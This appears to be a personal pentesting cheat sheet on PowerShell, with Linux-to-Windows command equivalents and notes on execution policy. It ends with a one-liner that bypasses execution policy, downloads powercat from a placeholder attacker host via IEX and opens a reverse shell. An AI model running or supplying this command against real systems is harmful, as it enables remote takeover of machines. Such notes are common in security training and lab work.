# PowerShell


## CMD
| Linux                 | Windows...                    |
|-----------------------|-------------------------------|
| `ls`                  | `ls`                          |
| `cd <dir>`            | `cd <dir>`                    |
| `rm`                  | `rm`                          |
| `mkdir`               | `New-Item`                    |
| `touch <file>`        | `New-Item`                    |

## General Purpose Knowledge
- Run a script: `powershell -File <file>`
- Running PS Scripts is disabled by default to protect the system from running malicious scripts.
    - Default PowerShell execution policy: `Restricted`
    - Get current policy: `Get-ExecutionPolicy`
    - Set policy: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`. Then answers with `A: Yes to All`

## Commands
- `Write-Output <string>`: print `<string>` to stdout

### Arguments
- `-ex bypass`: Bypass Execution Policy

## Useful commands when exploiting
- Downloading reverse PowerShell form http server and connecting back
```ps1
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:HTTP_PORT/powercat.ps1');powercat -c ATTACKER_IP -p NC_LISTENER_PORT -e cmd"
```
